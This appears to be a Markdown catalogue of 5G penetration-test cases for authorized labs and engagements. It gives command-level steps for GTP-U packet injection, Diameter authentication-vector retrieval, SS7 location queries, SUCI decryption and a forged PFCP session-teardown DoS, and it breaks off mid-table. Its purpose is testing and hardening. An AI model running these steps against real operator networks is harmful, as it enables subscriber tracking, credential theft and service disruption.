# 5G Telecom Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases organized by category with severity ratings.
> All commands assume an authorized engagement scope, a lab PLMN (test MCC 001 / MNC 01), or an explicit operator authorization with written rules of engagement. SS7/Diameter testing against production roaming interconnect requires explicit roaming-partner authorization and is out of scope for most private 5G engagements.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Lab Bring-Up & Baseline | 2 | INFO - LOW |
| B. Signaling Recon & Enumeration | 3 | LOW - MEDIUM |
| C. Protocol Fuzzing & Injection | 3 | HIGH - CRITICAL |
| D. Privacy & Identity Attacks | 2 | HIGH - CRITICAL |
| E. O-RAN & Slice Isolation | 2 | MEDIUM - HIGH |
| F. PFCP Deep Exploitation | 2 | HIGH - CRITICAL |
| G. Diameter Roaming Abuse | 1 | CRITICAL |
| H. SUCI/SUPI Privacy Deep | 1 | CRITICAL |
| I. O-RAN E2/A1 & RIC | 1 | HIGH |
| **Total** | **18** | **INFO - CRITICAL** |

---

## A. Lab Bring-Up & Baseline

### TC-5G-001: Open5GS + UERANSIM Lab Bring-Up

| Field | Value |
|------|-----|
| **ID** | TC-5G-001 |
| **Name** | Open5GS + UERANSIM Lab Bring-Up |
| **Severity** | INFO |
| **Category** | Lab Baseline |
| **Objective** | Bring up a complete 5G SA lab (5GC + gNB + UE) on Kali Linux for engagement reproduction, with all NFs (AMF/SMF/UPF/AUSF/UDM/PCF/NRF/NSSF) registered and a test UE successfully registered and assigned an IP. |
| **Prerequisites** | Kali Linux 2025-2 (or Ubuntu 22.04+), Docker, 16GB+ RAM. No SDR hardware required. |
| **Tools** | Open5GS (Docker), UERANSIM, tshark, curl, jq |
| **Steps** | 1. `git clone https://github.com/open5gs/open5gs /opt/open5gs && cd /opt/open5gs/docker && docker compose up -d` — bring up the 5GC NFs.<br>2. `docker compose ps` — verify all NFs (amf, smf, upf, nrf, ausf, udm, udr, pcf, nssf, webui) are `Up`.<br>3. `ss -A sctp -tlnp \| grep 38412` and `ss -ulnp \| grep -E '8805\|2152'` — confirm AMF/SMF/UPF are listening on their canonical ports.<br>4. `curl -sk https://localhost:8080/` — confirm WebUI is reachable (default admin/admin — CHANGE).<br>5. `curl -sk https://127.0.0.10:7777/nnrf-nfm/v1/nf-instances \| jq '.nfInstance[].nfType'` — verify all NFs have registered with the NRF.<br>6. `git clone https://github.com/aligungr/UERANSIM /opt/UERANSIM && cd /opt/UERANSIM && make -j$(nproc)` — build UERANSIM.<br>7. Configure `gnb.yaml` (AMF IP = 127.0.0.5) and `ue.yaml` (IMSI = `001010000000001`), launch `./nr-gnb` and `./nr-ue`.<br>8. `docker exec ue ip addr show uesimtun0` — confirm UE got an IP from SMF (10.45.0.x).<br>9. `docker exec ue ping -c 3 1.1.1.1` — confirm end-to-end data path. |
| **Expected Result** | All 10 NFs registered with NRF; gNB SCTP association with AMF established; UE registered with IP; ping succeeds through UPF to internet. |
| **False Positive Risk** | LOW — lab bring-up is deterministic. Common failures: Docker network conflicts (change compose subnet), host firewall (disable `ufw` for lab), missing SCTP kernel module (`modprobe sctp`). |
| **Cleanup** | `docker compose down -v` to remove lab containers and volumes. |
| **References** | payloads.md §1.1-1.4; Open5GS docs (open5gs.org); UERANSIM README |

### TC-5G-002: AMF NGAP Fingerprinting

| Field | Value |
|------|-----|
| **ID** | TC-5G-002 |
| **Name** | AMF NGAP / SCTP Fingerprinting |
| **Severity** | LOW |
| **Category** | Signaling Recon |
| **Objective** | Identify the AMF's NGAP service by sending SCTP INIT and NGSetupRequest, capturing the AMF's NGSetupResponse to extract PLMN, TAC, AMF Region/Set/Pointer, slice (S-NSSAI), and relative capacity. |
| **Prerequisites** | Network vantage point on the operator's internal network (engagement-scoped) OR local lab AMF. SCTP port 38412 reachable. |
| **Tools** | sctpscan, nmap (SCTP), tshark, scapy |
| **Steps** | 1. `/opt/sctpscan/sctpscan -a <amf-ip> -p 38412 -v` — confirm SCTP INIT/INIT-ACK exchange.<br>2. `sudo nmap -sU -sS -p 38412 --script=sctp-init-scan <amf-ip>` — confirm AMF accepts SCTP on 38412.<br>3. Send SCTP INIT via scapy: `python3 -c "from scapy.all import *; from scapy.contrib.sctp import *; send(IP(dst='<amf-ip>')/SCTP(sport=38412, dport=38412)/SCTPChunkInit())"`.<br>4. Capture the response: `sudo tshark -i any -f 'sctp port 38412' -Y ngap -w /tmp/ngap-setup.pcap -c 10`.<br>5. Parse the NGSetupResponse: `tshark -r /tmp/ngap-setup.pcap -Y ngap -V \| head -200` — extract PLMN, TAC, AMF_ID, slice, capacity.<br>6. Cross-reference PLMN against GSMA database to identify the operator. |
| **Expected Result** | SCTP INIT-ACK received from AMF on 38412; NGSetupResponse contains PLMN (MCC-MNC), TAC, slice S-NSSAI list, AMF Region/Set/Pointer, relative capacity byte. |
| **False Positive Risk** | LOW — NGAP responses are authoritative. SCTP INIT may be blocked by upstream firewall; if no response, verify network path before concluding AMF is hardened. |
| **Cleanup** | None (read-only reconnaissance). |
| **References** | payloads.md §3.1, §3.2; 3GPP TS 38.413 §9.6 (NGAP procedure codes) |

## B. Signaling Recon & Enumeration

### TC-5G-003: PFCP Enumeration of SMF/UPF

| Field | Value |
|------|-----|
| **ID** | TC-5G-003 |
| **Name** | PFCP Enumeration of SMF/UPF (N4 Interface) |
| **Severity** | MEDIUM |
| **Category** | Signaling Recon |
| **Objective** | Identify the SMF↔UPF N4 interface (UDP 8805), capture PFCP traffic during a registration, and enumerate the SEID (Session Endpoint Identifier) space and TEID (Tunnel Endpoint Identifier) mappings. |
| **Prerequisites** | Network vantage point on the N4 path OR local lab. SMF/UPF running and handling at least one active subscriber session. |
| **Tools** | tshark, Open5GS or free5GC lab, PacketRusher |
| **Steps** | 1. `sudo tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp.pcap &` — start PFCP capture.<br>2. Trigger a subscriber registration: `docker exec ue /UERANSIM/build/nr-ue -c /etc/ueransim/ue.yaml &`.<br>3. Wait ~10 seconds for the registration to complete (UE gets IP).<br>4. Stop capture and analyze: `tshark -r /tmp/pfcp.pcap -Y pfcp -T fields -e frame.time_relative -e ip.src -e ip.dst -e pfcp.msg_type_name -e pfcp.seid \| sort -u \| head -30`.<br>5. Extract unique SEIDs: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' -T fields -e pfcp.seid \| sort -u` — identifies per-session 64-bit SEIDs.<br>6. Extract TEID/IP mappings: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.f_teid_teid' -T fields -e pfcp.f_teid_teid -e pfcp.f_teid_v4 \| sort -u` — TEID to GTP-U IP map.<br>7. Confirm SEID↔IMSI correlation by joining timestamps with NGAP capture: `tshark -r /tmp/n2.pcap -Y 'nas_5gs.message_type == 0x41' -T fields -e frame.time -e nas_5gs.mobile_identity.imsi`. |
| **Expected Result** | PFCP messages captured: Heartbeat, Association Setup, Session Establishment Request (with SEID). Unique SEIDs identified. TEID↔IPv4 map extracted. SEID↔IMSI correlation possible via timestamps. |
| **False Positive Risk** | LOW — PFCP is deterministic. Empty SEID list indicates either no active sessions or capture on wrong interface. |
| **Cleanup** | None (passive capture). |
| **References** | payloads.md §4.1, §4.2; 3GPP TS 29.244 §7.4 |

### TC-5G-004: GTP-U Tunnel Injection

| Field | Value |
|------|-----|
| **ID** | TC-5G-004 |
| **Name** | GTP-U Tunnel Injection PoC (Downlink Spoofing) |
| **Severity** | HIGH |
| **Category** | Protocol Injection |
| **Objective** | Demonstrate that the UPF forwards GTP-U packets with attacker-supplied TEIDs from a non-gNB source IP — the classic N3 injection class. The subscriber receives a crafted inner packet they never initiated, confirming the UPF does not validate GTP-U source. |
| **Prerequisites** | Authorized lab or operator engagement. UPF GTP-U port (UDP 2152) reachable. Captured valid TEID in use (from TC-5G-003 or capture). Test UE with `tcpdump` on its interface. |
| **Tools** | tshark, scapy, PacketRusher |
| **Steps** | 1. Capture GTP-U traffic to obtain a valid TEID: `sudo tshark -i any -f 'udp port 2152' -Y gtp -w /tmp/gtpu.pcap &` then trigger subscriber traffic (`ping` from UE).<br>2. Extract an active TEID: `tshark -r /tmp/gtpu.pcap -Y gtp -T fields -e gtp.teid \| sort -u \| head -1`.<br>3. On the subscriber UE, start tcpdump: `tcpdump -ni uesimtun0 'tcp and src host 203.0.113.42' -w /tmp/injected.pcap`.<br>4. From a different vantage (non-gNB source), send crafted GTP-U packet: `python3 gtpu-injection-poc.py <upf-ip> 0x<TEID>` (script in payloads.md §6.3).<br>5. Wait 5 seconds, then stop tcpdump on the UE and analyze: `tshark -r /tmp/injected.pcap -V \| head -50`.<br>6. If the crafted TCP SYN from 203.0.113.42 appears on the UE interface, GTP-U injection is confirmed. |
| **Expected Result** | On a vulnerable UPF: the crafted inner packet appears on the UE interface — confirming the UPF forwards GTP-U from any source with a valid TEID. On a hardened UPF: no packet appears — confirming source IP filtering or per-session TEID validation. |
| **False Positive Risk** | MEDIUM — capture interface and TEID must match the active subscriber session. Stale TEIDs (from a torn-down session) will not be forwarded; this is normal UPF behavior, not a hardening confirmation. |
| **Cleanup** | Stop captures. Discard crafted packets (one-shot, no state changes). |
| **References** | payloads.md §6.1-6.3; 3GPP TS 29.281 (GTP-U) |

### TC-5G-005: GTP-C Fuzzing with scapy

| Field | Value |
|------|-----|
| **ID** | TC-5G-005 |
| **Name** | GTP-C v2 Fuzzing with scapy |
| **Severity** | HIGH |
| **Category** | Protocol Fuzzing |
| **Objective** | Fuzz the GTP-C v2 control plane (UDP 2123) of a lab SGW or interworking SMF to identify parser crashes, memory errors, or unexpected message handling. |
| **Prerequisites** | Lab with 4G/LTE interworking OR a GTP-C v2 service on UDP 2123. AFL++ optional for higher-coverage fuzzing. |
| **Tools** | scapy, AFL++ (optional), tshark |
| **Steps** | 1. Capture baseline GTP-C traffic: `sudo tshark -i any -f 'udp port 2123' -Y gtp -w /tmp/gtpc-baseline.pcap` and trigger one Create Session Request.<br>2. Identify the SGW IP and message structure: `tshark -r /tmp/gtpc-baseline.pcap -Y gtp -T fields -e ip.dst -e gtp.v2.msgtype_name \| head -5`.<br>3. Build a base GTP-C v2 Create Session Request in scapy: `python3 -c "from scapy.all import *; from scapy.contrib.gtp_v2 import *; pkt = IP(dst='<sgw-ip>')/UDP(sport=2123, dport=2123)/GTPHeader(version=2, S=1, teid=0x01020304, seq=1, msg_type=32); send(pkt)"`.<br>4. Implement the mutation fuzzer (byte flip + length mutation) from payloads.md §7.3.<br>5. Run 1,000 iterations, monitoring SGW for crashes: `docker logs sgw --tail 50 -f \| grep -iE 'segfault\|panic\|abort'`.<br>6. (Optional) Build an AFL++ harness: `CC=afl-gcc meson setup build` and run `afl-fuzz -i corpus -o findings -- ./sgw-fuzz-harness @@`.<br>7. Triage any crash: capture the triggering input, identify the parser location via AddressSanitizer, file a bug with the operator or upstream. |
| **Expected Result** | Lab SGW handles malformed inputs gracefully (rejects, no crash) — indicates parser robustness. If crashes found: identify root cause (off-by-one in length field, uninitialized memory, signed/unsigned confusion), report via coordinated disclosure. |
| **False Positive Risk** | MEDIUM — network latency may cause apparent non-response; verify via SGW logs that the message was received and rejected, not dropped. |
| **Cleanup** | Stop fuzzer, restart SGW if crashed. |
| **References** | payloads.md §7.1-7.3; 3GPP TS 29.274 (GTP-C v2) |

## C. Protocol Fuzzing & Injection

### TC-5G-006: Diameter S6a Testing

| Field | Value |
|------|-----|
| **ID** | TC-5G-006 |
| **Name** | Diameter S6a (MME↔HSS) Authentication Vector Retrieval |
| **Severity** | CRITICAL |
| **Category** | Roaming Abuse |
| **Objective** | Demonstrate that an authorized roaming peer (or an attacker with peer credentials) can retrieve authentication vectors for a subscriber that is NOT roaming on that visited network — the classic Diameter abuse class documented by Positive Technologies (2017+). |
| **Prerequisites** | Operator-side engagement with explicit roaming-partner authorization. Lab reproduction with OsmoHLR or a commercial HSS. SCTP port 3868 reachable. |
| **Tools** | seagull (Linux), scapy-diameter, tshark |
| **Steps** | 1. Confirm SCTP 3868 between MME and HSS: `/opt/sctpscan/sctpscan -a <hss-ip> -p 3868 -v`.<br>2. Capture baseline S6a traffic: `sudo tshark -i any -f 'sctp port 3868' -Y diameter -w /tmp/s6a.pcap &`.<br>3. Identify the command codes in use: `tshark -r /tmp/s6a.pcap -Y diameter -T fields -e diameter.cmd.code -e diameter.cmd.flags.request \| sort -u`.<br>4. Construct an Authentication-Information-Request (AIR) using seagull with the roaming peer's credentials (script in payloads.md §8.3).<br>5. Target an IMSI known to be NOT currently registered on the visited network (engagement-scoped test IMSI).<br>6. Send the AIR and capture the response.<br>7. Parse the AIA (Authentication Information Answer): `tshark -r /tmp/s6a.pcap -Y 'diameter.cmd.code == 318 && diameter.cmd.flags.request == 0' -V \| grep -E 'RAND\|AUTN\|XRES\|KASME'`.<br>8. If the AIA contains authentication vectors for a subscriber not on the visited network: roaming abuse confirmed. |
| **Expected Result** | On a vulnerable HSS: AIA returns authentication vectors (RAND/AUTN/XRES/KASME) for any IMSI without checking the visited-network context. On a hardened HSS: AIA returns an error (DIAMETER_ERROR_USER_UNKNOWN or DIAMETER_ERROR_ROAMING_NOT_ALLOWED). |
| **False Positive Risk** | HIGH — engagement MUST be explicitly authorized for Diameter roaming tests. Use engagement-scoped test IMSIs only; never use production subscriber IMSIs. |
| **Cleanup** | Stop capture. Coordinate with HSS team to confirm no subscriber state changes persisted. |
| **References** | payloads.md §8.1-8.4; 3GPP TS 29.272 (S6a); Positive Technologies Diameter research (2017-2023) |

### TC-5G-007: SS7 MAP Legacy Testing (with Legal Caveats)

| Field | Value |
|------|-----|
| **ID** | TC-5G-007 |
| **Name** | SS7 MAP Lab Reproduction (Closed Lab Only) |
| **Severity** | CRITICAL |
| **Category** | Legacy Roaming |
| **Objective** | In a closed lab, reproduce the Karsten Nohl (2014-2016) class of SS7 MAP abuse: Provide-Subscriber-Info (PSI) for location tracking and Send-Authentication-Info (SAI) for subscriber impersonation, using ss7MAPer against OsmoHLR. |
| **Prerequisites** | Closed lab only. SS7 testing against production operators is illegal in most jurisdictions without explicit authorization. This test case is for historical context reproduction and operator-side SS7 firewall validation. |
| **Tools** | ss7MAPer, OsmoHLR/OsmoMSC, tshark |
| **Steps** | 1. Bring up OsmoHLR lab: `git clone https://gitea.osmocom.org/osmo-hlr /opt/osmo-hlr && cd /opt/osmo-hlr && autoreconf -fi && ./configure && make && ./src/osmo-hlr -c /etc/osmocom/osmo-hlr.cfg &`.<br>2. Bring up OsmoMSC: clone, build, run as SS7 MAP peer.<br>3. Build ss7MAPer: `git clone https://github.com/ernw/ss7MAPer /opt/ss7MAPer && cd /opt/ss7MAPer && cmake . && make`.<br>4. Add a test subscriber to OsmoHLR with IMSI 001010000000001 (engagement test PLMN).<br>5. Send MAP PSI from ss7MAPer: `/opt/ss7MAPer/ss7MAPer --remote-ip 127.0.0.1 --remote-port 2905 --operation provideSubscriberInfo --imsi 001010000000001`.<br>6. Capture the response: `sudo tshark -i any -f 'tcp port 2905 or sctp port 2905' -Y 'sccp || map' -V \| head -100`.<br>7. Document whether OsmoHLR returns subscriber location (vulnerable) or rejects the unauthorized PSI (hardened). |
| **Expected Result** | On a vulnerable HLR: PSI returns subscriber location (cell ID, VLR address). On a hardened HLR (with SS7 firewall): PSI is rejected or filtered. OsmoHLR lab exposes the vulnerable behavior; production HLRs with SS7 firewalls (GSMA FS.32) should reject. |
| **False Positive Risk** | HIGH — SS7 testing outside a closed lab is illegal. The lab must be air-gapped from any production SS7 interconnect. Document scope, authorization, and capture/retention policy. |
| **Cleanup** | Stop OsmoHLR and ss7MAPer. Destroy the lab VM. |
| **References** | payloads.md §9.1-9.5; Karsten Nohl BlackHat 2014/2016; GSMA FS.32 SS7 recommendations |

### TC-5G-008: IMSI Catcher Detection Workflow

| Field | Value |
|------|-----|
| **ID** | TC-5G-008 |
| **Name** | IMSI Catcher Detection (Passive Survey) |
| **Severity** | MEDIUM |
| **Category** | Defensive Detection |
| **Objective** | Defensively survey a cellular band using SDR (passive reception only — legal in most jurisdictions) to detect rogue base stations that would trigger UE IMSI/SUCI disclosure, or to detect cells not in the operator's planned inventory. |
| **Prerequisites** | SDR hardware (USRP B210 / BladeRF 2.0 micro / HackRF One). Physical location with cellular coverage. No transmission required — passive survey only. |
| **Tools** | srsRAN scanner, gr-lte, AIMSICD (Android), tshark |
| **Steps** | 1. Verify SDR: `uhd_usrp_probe` or `hackrf_info`.<br>2. Survey the LTE band (e.g., B2 1900-1990 MHz downlink): `cd /opt/srsran_4g/build && ./scanner/srsran_scanner --band 2 --freq_start 1.930e9 --freq_end 1.990e9` — record detected cells (PLMN, cell ID, PCI, RSRP).<br>3. Survey 5G band (n78 3.3-3.8 GHz): use srsRAN 5G scanner or gr-SDR script to detect SSB bursts and decode SIB1.<br>4. Cross-reference detected cells against OpenCellID database and the operator's planned inventory.<br>5. Flag cells with PLMN not matching the target operator, or PCI conflicts, or cell IDs not in inventory.<br>6. For deeper analysis: capture full SIB1 of suspected rogue cells and decode via Wireshark.<br>7. (Optional) Deploy AIMSICD on a rooted Android device with Qualcomm DIAG access; collect detection logs over 24-48 hours.<br>8. Pull AIMSICD logs: `adb pull /sdcard/AIMSICD/Detection_Log.db` and analyze silent SMS, LAC/TAC changes, forced downgrades. |
| **Expected Result** | All detected cells match the operator's planned inventory (PLMN, TAC, cell ID). No rogue base stations detected. If anomalies found: cell ID not in inventory, PLMN mismatch, or PCI conflict — investigate further as candidate IMSI catcher. |
| **False Positive Risk** | MEDIUM — temporary cells (event coverage, mobile cell-on-wheels) are legitimate. Confirm with the operator before classifying as rogue. |
| **Cleanup** | None (passive reception). |
| **References** | payloads.md §10.1-10.4; 3GPP TS 38.331 (SIB1); AIMSICD docs |

## D. Privacy & Identity Attacks

### TC-5G-009: SUCI/SUPI Privacy Analysis

| Field | Value |
|------|-----|
| **ID** | TC-5G-009 |
| **Name** | SUCI Protection Scheme Analysis and Decryption PoC |
| **Severity** | CRITICAL |
| **Category** | Subscriber Privacy |
| **Objective** | Analyze the operator's deployed SUCI protection scheme (null vs ECIES Profile A/B) and demonstrate that the SUCI can be decrypted to recover the SUPI when the operator's home network public key is weak or known — the Alonso et al. (2021) class of attack. |
| **Prerequisites** | Operator-side engagement OR lab reproduction with operator's home network private key (engagement-scoped). NAS capture (N1/N2) with at least one RegistrationRequest message containing a SUCI. |
| **Tools** | tshark, Python cryptography, operator's home network private key |
| **Steps** | 1. Capture NAS messages: `sudo tshark -i any -f 'sctp port 38412' -Y 'nas-5gs' -w /tmp/nas.pcap`.<br>2. Extract SUCI from RegistrationRequest: `tshark -r /tmp/nas.pcap -Y 'nas_5gs.message_type == 0x41' -T fields -e nas_5gs.mobile_identity.suci.protection_scheme -e nas_5gs.mobile_identity.suci.home_network_public_key_id -e nas_5gs.mobile_identity.suci.scheme_output \| head -5`.<br>3. If protection_scheme == 0 (null scheme): CRITICAL — SUPI is in cleartext in the scheme_output field. Document.<br>4. If protection_scheme == 1 or 2 (ECIES Profile A/B): proceed with decryption PoC.<br>5. Parse the scheme_output into: ephemeral public key (32 bytes for Profile A, 33 for Profile B), ciphertext, MAC tag.<br>6. Run the decryption PoC (payloads.md §11.2) using the operator's home network private key (from environment variable).<br>7. Verify the decrypted SUPI matches the expected IMSI.<br>8. (Defensive) Check the operator's published public key against known weak keys (payloads.md §11.3). |
| **Expected Result** | For null scheme: SUPI in cleartext (CRITICAL). For ECIES with weak/known key: decrypted SUPI matches expected IMSI (CRITICAL). For ECIES with strong key: decryption fails (cannot decrypt without operator's private key — the intended behavior). |
| **False Positive Risk** | LOW — the protection_scheme field is authoritative. Decryption only succeeds if the key is weak/known; failure to decrypt with an unknown key is the intended design. |
| **Cleanup** | Destroy the temporary private key material. |
| **References** | payloads.md §11.1-11.3; 3GPP TS 33.501 Annex C; Alonso et al. 5G AIA/ARIA paper (2021) |

### TC-5G-010: O-RAN O1 Interface Scan

| Field | Value |
|------|-----|
| **ID** | TC-5G-010 |
| **Name** | O-RAN O1 Interface (NETCONF/RESTCONF) Security Test |
| **Severity** | HIGH |
| **Category** | O-RAN Security |
| **Objective** | Identify and test the O1 interface on an O-RAN compliant O-RU/O-DU/O-CU for: default credentials, unauthenticated NETCONF/RESTCONF access, weak TLS configuration, and command injection in YANG model inputs. |
| **Prerequisites** | Authorized engagement against O-RAN infrastructure. O-RU/O-DU/O-CU IP addresses in scope. Network vantage point with reachability to O1 ports (830, 443, 80). |
| **Tools** | nmap, curl, ssh (netconf), netconf-cli |
| **Steps** | 1. Port scan O1 services: `nmap -p 22,80,443,830,4443 <o-ru-ip> <o-du-ip> <o-cu-ip>`.<br>2. Fingerprint NETCONF service: `ssh netconf@<o-ru-ip> -p 830 -s netconf` and send hello+get XML (payloads.md §13.2).<br>3. Test default credentials (engagement-scoped; payloads.md §13.3 lists known defaults — change in lab).<br>4. Fingerprint RESTCONF: `curl -sk -v https://<o-ru-ip>:443/restconf/ -I 2>&1 \| head -20`.<br>5. Enumerate YANG models: `curl -sk https://<o-ru-ip>:443/restconf/data/netconf-state/capabilities \| jq`.<br>6. Test for command injection in YANG model string inputs (e.g., device name fields).<br>7. Check TLS configuration: `nmap --script ssl-enum-ciphers -p 443,830 <o-ru-ip>`.<br>8. Document: unauthenticated access, weak TLS (TLSv1.0/1.1), default creds, injection points. |
| **Expected Result** | Hardened O-RAN: all O1 ports require authentication, TLSv1.2+ only, no default credentials, YANG inputs sanitized. Vulnerable O-RAN (early deployments): default credentials work, RESTCONF is unauthenticated, weak TLS enabled, command injection in YANG inputs. |
| **False Positive Risk** | LOW — direct authentication tests are authoritative. |
| **Cleanup** | Revert any test configuration changes. |
| **References** | payloads.md §13.1-13.6; O-RAN Alliance WG10 (Security); IETF RFC 6241 (NETCONF) |

## E. O-RAN & Slice Isolation

### TC-5G-011: Network Slice Isolation Test

| Field | Value |
|------|-----|
| **ID** | TC-5G-011 |
| **Name** | Network Slice Cross-Talk Test |
| **Severity** | HIGH |
| **Category** | Slice Isolation |
| **Objective** | Verify that a subscriber in slice A cannot enumerate or access NFs in slice B via the NRF or via direct SBI calls. This tests the slice isolation guarantees promised by 5G slicing. |
| **Prerequisites** | Lab or operator 5GC with multiple slices configured (e.g., eMBB SST=1 and URLLC SST=2). NRF SBI endpoint reachable. Subscriber credential in slice A. |
| **Tools** | curl, jq, tshark |
| **Steps** | 1. Enumerate configured slices: `curl -sk "https://<nrf-ip>:7777/nnssf-nsselection/v1/network-slice-instances" \| jq`.<br>2. Map NFs to slices: for each slice SST in {1, 2, 3}, `curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?slice-info=$sst" \| jq -r '.nfInstance[].nfType' \| sort -u`.<br>3. Authenticate as a subscriber in slice A (e.g., SST=1).<br>4. Attempt to query NFs in slice B (e.g., SST=2) using the slice A subscriber's token: `curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?slice-info=2" -H "Authorization: Bearer <sliceA-token>" \| jq`.<br>5. Attempt a direct SBI call to an NF in slice B (e.g., `GET /nudm-sdm/v1/slice-b-data/subscriber-123`)<br>6. Attempt GTP-U traffic between UPFs of slice A and slice B (if UPF isolation is in scope).<br>7. Document: any cross-slice access (NRF enumeration, SBI call success, or GTP-U cross-slice traffic). |
| **Expected Result** | Hardened 5GC: NRF rejects cross-slice queries (HTTP 403 or empty result), NFs reject cross-slice SBI calls, UPFs have no cross-slice TEIDs. Vulnerable 5GC: NRF returns slice B NF list to slice A subscriber, or SBI call succeeds, or GTP-U cross-slice traffic is forwarded. |
| **False Positive Risk** | MEDIUM — verify the subscriber is actually in slice A (via AMF logs) before concluding cross-talk. Some deployments share NFs across slices by design (NSSF may permit; verify against operator's slice policy). |
| **Cleanup** | None (read-only enumeration and SBI call tests). |
| **References** | payloads.md §15.1-15.4; 3GPP TS 23.501 §5.15 (Network Slicing) |

### TC-5G-012: 5G Dissection with tshark

| Field | Value |
|------|-----|
| **ID** | TC-5G-012 |
| **Name** | 5G Protocol Dissection with tshark (NGAP/PFCP/GTP/NAS) |
| **Severity** | LOW |
| **Category** | Signaling Analysis |
| **Objective** | Capture and dissect the full 5GC signaling stack (NGAP, PFCP, GTP-U, NAS-5GS, Diameter if present) in a single tshark pipeline, producing structured event logs suitable for anomaly detection or post-engagement analysis. |
| **Prerequisites** | Lab or operator engagement with network vantage point on the 5GC signaling interfaces. tshark installed with 5G dissectors. |
| **Tools** | tshark |
| **Steps** | 1. Verify 5G dissectors present: `tshark -G protocols \| grep -iE 'ngap\|pfcp\|gtp\|nas-5gs\|diameter\|s1ap'`.<br>2. Start multi-protocol capture: `sudo tshark -i any -f 'sctp port 38412 or sctp port 3868 or udp port 8805 or udp port 2152 or udp port 2123 or tcp port 443 or tcp port 7777' -Y 'ngap \|\| pfcp \|\| gtp \|\| nas-5gs \|\| diameter \|\| http2' -w /tmp/5gc-full-$(date +%s).pcap`.<br>3. Trigger a subscriber registration and some data traffic.<br>4. Stop capture after 60 seconds.<br>5. Stream dissection into per-protocol CSVs: `tshark -r /tmp/5gc-full-*.pcap -Y ngap -T fields -e frame.time -e ngap.procedure_code -e ngap.RAN_UE_NGAP_ID -e ngap.AMF_UE_NGAP_ID > /tmp/ngap-events.csv`.<br>6. PFCP: `tshark -r /tmp/5gc-full-*.pcap -Y pfcp -T fields -e frame.time -e pfcp.msg_type_name -e pfcp.seid -e pfcp.f_teid_teid > /tmp/pfcp-events.csv`.<br>7. GTP: `tshark -r /tmp/5gc-full-*.pcap -Y gtp -T fields -e frame.time -e gtp.teid -e ip.src -e ip.dst > /tmp/gtp-events.csv`.<br>8. NAS-5GS: `tshark -r /tmp/5gc-full-*.pcap -Y nas_5gs -T fields -e frame.time -e nas_5gs.message_type -e _ws.col.Info > /tmp/nas-events.csv`.<br>9. Verify NAS security mode completed (ciphering/integrity activated): `grep -E 'Security Mode' /tmp/nas-events.csv`.<br>10. Identify any anomalies: NULL ciphering (NEA0/NIA0), unexpected message types, source IP mismatches. |
| **Expected Result** | All four CSVs populated with structured events. NAS security mode activation confirmed (NEA1+ or NIA1+ selected, NEA0/NIA0 NOT selected). No anomalous source IPs. No unexpected message types (e.g., no PFCP Session Deletion without prior Establishment). |
| **False Positive Risk** | LOW — tshark dissection is authoritative. Verify capture interface and filter cover all in-scope interfaces. |
| **Cleanup** | None (read-only capture and dissection). |
| **References** | payloads.md §16.1-16.5; 3GPP TS 38.413 (NGAP), TS 29.244 (PFCP), TS 24.501 (NAS-5GS) |

## F. PFCP Deep Exploitation

### TC-5G-013: PFCP Session Teardown DoS (Praetorian Class)

| Field | Value |
|------|-----|
| **ID** | TC-5G-013 |
| **Name** | PFCP Session Deletion Request Injection (Praetorian 2019 DoS Class) |
| **Severity** | CRITICAL |
| **Category** | PFCP Deep Exploitation |
| **Objective** | Reproduce the Praetorian (2019) class of 5GC DoS: inject a forged PFCP Session Deletion Request with a captured SEID into a UPF that does not authenticate the SMF source, causing the subscriber session to be torn down. Demonstrates the canonical N4 unauthenticated source attack. |
| **Prerequisites** | Authorized lab only (Open5GS or free5GC). Captured valid SEID from TC-5G-003. UPF reachable on UDP 8805 from a non-SMF vantage point. Vantage point that can spoof source IP (for full reproduction) OR send from real IP (for hardening test). |
| **Tools** | scapy (with scapy.contrib.pfcp), tshark, Open5GS lab |
| **Steps** | 1. From TC-5G-003 capture, identify an active SEID: `tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' -T fields -e pfcp.seid \| sort -u \| head -1`.<br>2. Identify SMF source IP and UPF IP: `tshark -r /tmp/pfcp.pcap -Y pfcp -T fields -e ip.src -e ip.dst \| sort -u`.<br>3. Confirm the subscriber session is active: `docker exec ue ping -c 1 1.1.1.1`.<br>4. Construct a PFCP Session Deletion Request (msg_type=54) with the captured SEID using the PoC from payloads.md §4.4.<br>5. Send from a non-SMF vantage (unauthenticated source reproduction): `python3 pfcp-teardown-poc.py --upf <upf-ip> --seid 0x<SEID> --src-ip <spoofed-or-real>`.<br>6. Simultaneously capture N4: `tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp-inject.pcap`.<br>7. Within 1-2 seconds, verify on the UE: `docker exec ue ping -c 3 1.1.1.1` — session is torn down if pings fail.<br>8. Check SMF logs for session release cause: `docker logs smf --tail 50 \| grep -iE 'session.release\|PFCP Deletion'`.<br>9. Document: SMF log showing "session deletion received" with no upstream UE-initiated cause → confirms unauthenticated N4 source vulnerability. |
| **Expected Result** | Vulnerable UPF: session torn down, UE ping fails, SMF logs show "PFCP Session Deletion Request received" from the forged source. Hardened UPF (DTLS on N4, source IP allowlist, or per-session SEID validation against SMF peer): forged request rejected or silently dropped, subscriber session persists. |
| **False Positive Risk** | MEDIUM — stale SEIDs (from a session already released normally) will appear to "succeed" but were already gone. Always verify the session was active immediately before injection by checking UE ping or SMF session table. |
| **Remediation** | Deploy DTLS on the N4 interface (3GPP TS 33.501 §6.6.2); configure UPF source IP allowlist to accept PFCP only from the SMF; enable per-session SEID validation that cross-checks the source against the SEID owner; monitor for PFCP Session Deletion Requests that lack a corresponding SMF-initiated cause. |
| **Cleanup** | Re-trigger UE registration to re-establish the torn-down session. Stop all captures. |
| **References** | payloads.md §4.1, §4.4; 3GPP TS 29.244 §7.4; Praetorian 5G vulnerability research (2019); 3GPP TS 33.501 §6.6.2 |

### TC-5G-014: PFCP Session Modification (Traffic Redirection)

| Field | Value |
|------|-----|
| **ID** | TC-5G-014 |
| **Name** | PFCP Session Modification Request — Subscriber Traffic Redirection |
| **Severity** | CRITICAL |
| **Category** | PFCP Deep Exploitation |
